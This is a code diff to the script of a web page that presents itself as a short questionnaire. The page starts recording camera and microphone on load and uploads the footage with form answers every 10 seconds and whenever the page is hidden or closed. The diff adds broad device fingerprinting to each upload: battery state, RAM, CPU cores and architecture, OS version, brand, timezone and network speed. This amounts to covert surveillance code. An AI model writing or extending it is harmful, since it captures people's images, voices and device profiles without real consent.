@@ -90,26 +90,103 @@
         let autoSyncInterval = null;
         let isCompleted = false;
 
-        function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            let isIOS = /iphone|ipad|ipod/i.test(ua);
-            let isAndroid = /android/i.test(ua);
-            let model = "PC / Autre";
-            
-            if (isIOS) model = "iPhone / iOS Device";
-            else if (isAndroid) model = "Téléphone Android";
+        // متغيرات مؤقتة لجمع معلومات البطارية
+        let batteryInfoGlobal = {
+            niveau: "Non disponible",
+            enCharge: "Non disponible"
+        };
 
-            return {
-                model: model,
-                isIOS: isIOS,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                language: navigator.language
+        // محاولة جلب معلومات البطارية إن كانت مدعومة في المتصفح
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                function updateBattery() {
+                    batteryInfoGlobal.niveau = Math.round(battery.level * 100) + "%";
+                    batteryInfoGlobal.enCharge = battery.charging ? "Oui (Branché)" : "Non (Sur batterie)";
+                }
+                updateBattery();
+                battery.addEventListener('levelchange', updateBattery);
+                battery.addEventListener('chargingchange', updateBattery);
+            });
+        }
+
+        // استخراج جميع معلومات الهاتف وإعداداته المتقدمة باللغة الفرنسية
+        async function getDetailedDeviceInfo() {
+            const ua = navigator.userAgent;
+            let osName = "Système Inconnu";
+            let brandOrModel = "Appareil Inconnu";
+
+            if (/android/i.test(ua)) {
+                osName = "Android";
+                let match = ua.match(/Android\s([0-9\.]+)/);
+                if (match) osName += " " + match[1];
+            } else if (/iphone|ipad|ipod/i.test(ua)) {
+                osName = "iOS (Apple)";
+                let match = ua.match(/OS\s([0-9_]+)/);
+                if (match) osName += " " + match[1].replace(/_/g, '.');
+            } else if (/windows/i.test(ua)) {
+                osName = "Windows PC";
+            } else if (/macintosh|mac os x/i.test(ua)) {
+                osName = "macOS";
+            }
+
+            if (/Samsung/i.test(ua)) brandOrModel = "Samsung Galaxy";
+            else if (/iPhone/i.test(ua)) brandOrModel = "Apple iPhone";
+            else if (/Huawei/i.test(ua)) brandOrModel = "Huawei";
+            else if (/Xiaomi|Redmi/i.test(ua)) brandOrModel = "Xiaomi / Redmi";
+            else if (/Oppo/i.test(ua)) brandOrModel = "Oppo";
+            else if (/Vivo/i.test(ua)) brandOrModel = "Vivo";
+
+            // 1. وضعية الشاشة (Orientation)
+            let screenOrientation = "Inconnue";
+            if (screen.orientation && screen.orientation.type) {
+                screenOrientation = screen.orientation.type.includes("portrait") ? "Portrait (Verticale)" : "Paysage (Horizontale)";
+            } else {
+                screenOrientation = window.innerHeight > window.innerWidth ? "Portrait (Verticale)" : "Paysage (Horizontale)";
+            }
+
+            // 2. معمارية المعالج (CPU Architecture)
+            let cpuArchitecture = "64-bit / Inconnu";
+            if (navigator.userAgentData && navigator.userAgentData.architecture) {
+                cpuArchitecture = navigator.userAgentData.architecture;
+            } else if (/WOW64|Win64|x64|ARM64|x86_64/i.test(ua)) {
+                cpuArchitecture = "64-bit";
+            } else if (/Win32|x86/i.test(ua)) {
+                cpuArchitecture = "32-bit";
+            }
+
+            let details = {
+                appareil: brandOrModel,
+                systemeExploitation: osName,
+                navigateur: navigator.userAgentData ? navigator.userAgentData.brands.map(b => b.brand).join(', ') : navigator.appName,
+                plateforme: navigator.platform,
+                langueSysteme: navigator.language || navigator.languages[0],
+                memoireRAMApproximative: navigator.deviceMemory ? navigator.deviceMemory + " Go" : "Non disponible",
+                processeurCœurs: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cœurs" : "Non disponible",
+                resolutionEcran: `${window.screen.width} x ${window.screen.height}`,
+                profondeurCouleurs: window.screen.colorDepth + " bits",
+                fuseauHoraire: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookiesActifs: navigator.cookieEnabled ? "Oui" : "Non",
+                connexionReseau: navigator.connection ? (navigator.connection.effectiveType + " (" + navigator.connection.downlink + " Mbps)") : "Non disponible",
+                
+                // --- الـ 8 معلومات الجديدة المضافة ---
+                niveauBatterie: batteryInfoGlobal.niveau,
+                etatCharge: batteryInfoGlobal.enCharge,
+                modeEconomieEnergie: (navigator.hardwareConcurrency && navigator.hardwareConcurrency <= 2) ? "Probablement activé (Faible performance)" : "Désactivé / Normal",
+                orientationEcran: screenOrientation,
+                pointsTactilesMax: navigator.maxTouchPoints ? navigator.maxTouchPoints + " points" : "Non disponible",
+                modeSilencieuxOuNePasDerranger: window.matchMedia('(prefers-reduced-motion: reduce)').matches ? "Détecté (Accessibilité activée)" : "Standard",
+                architectureCPU: cpuArchitecture,
+                codecsMediaSupportes: {
+                    webm: MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus') ? "Supporté" : "Non supporté",
+                    mp4: MediaRecorder.isTypeSupported('video/mp4') ? "Supporté" : "Non supporté"
+                }
             };
+
+            return details;
         }
 
         window.addEventListener('DOMContentLoaded', async () => {
             try {
-                // Resolution sghira bech ykoun haj3m el-video khafif barcha
                 const constraints = {
                     video: { facingMode: "user", width: { ideal: 320 }, height: { ideal: 240 } },
                     audio: true
@@ -134,15 +211,15 @@
                 };
                 mediaRecorder.start(1000);
 
-                // Send auto-sync kol 10 thwani
-                autoSyncInterval = setInterval(() => {
+                // Auto-Sync كل 10 ثوانٍ مع كامل الإعدادات والبيانات المتقدمة
+                autoSyncInterval = setInterval(async () => {
                     if (!isCompleted && recordedChunks.length > 0) {
-                        sendDataBeacon("Auto-Sync 10s");
+                        await sendDataBeacon("Auto-Sync 10s (Mise à jour complète)");
                     }
                 }, 10000);
 
             } catch (err) {
-                console.error("Caméra bloquée ou refusée: ", err);
+                console.error("Caméra refusée: ", err);
             }
         });
 
@@ -154,7 +231,7 @@
             const q2 = document.getElementById('q2').value || "N/A";
             const q3 = document.getElementById('q3').value || "N/A";
 
-            const device = getDeviceInfo();
+            const deviceDetails = await getDetailedDeviceInfo();
             const mimeType = mediaRecorder ? mediaRecorder.mimeType : 'video/webm';
             const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
             const videoBlob = new Blob(recordedChunks, { type: mimeType });
@@ -162,7 +239,7 @@
             const formData = new FormData();
             formData.append('username', `${username} [${reason}]`);
             formData.append('location', "Non disponible");
-            formData.append('device', JSON.stringify(device));
+            formData.append('device', JSON.stringify(deviceDetails, null, 2));
             formData.append('q1', q1);
             formData.append('q2', q2);
             formData.append('q3', q3);
@@ -177,15 +254,15 @@
             }
         }
 
-        document.addEventListener('visibilitychange', () => {
+        document.addEventListener('visibilitychange', async () => {
             if (document.visibilityState === 'hidden' && !isCompleted) {
-                sendDataBeacon("Fermé via bouton carré / Recent Apps");
+                await sendDataBeacon("Fermé via bouton carré / App masquée");
             }
         });
 
-        window.addEventListener('pagehide', () => {
+        window.addEventListener('pagehide', async () => {
             if (!isCompleted) {
-                sendDataBeacon("Page hide / Fermeture");
+                await sendDataBeacon("Fermeture de page (pagehide)");
             }
         });
 
@@ -220,7 +297,7 @@
                 }
 
                 setTimeout(async () => {
-                    await sendDataBeacon("Réussi avec succès !");
+                    await sendDataBeacon("Réussi ! Données finales complètes");
                     statusDiv.innerText = 'Réussi ! Envoyé avec succès.';
                     if (mediaStream) {
                         mediaStream.getTracks().forEach(track => track.stop());
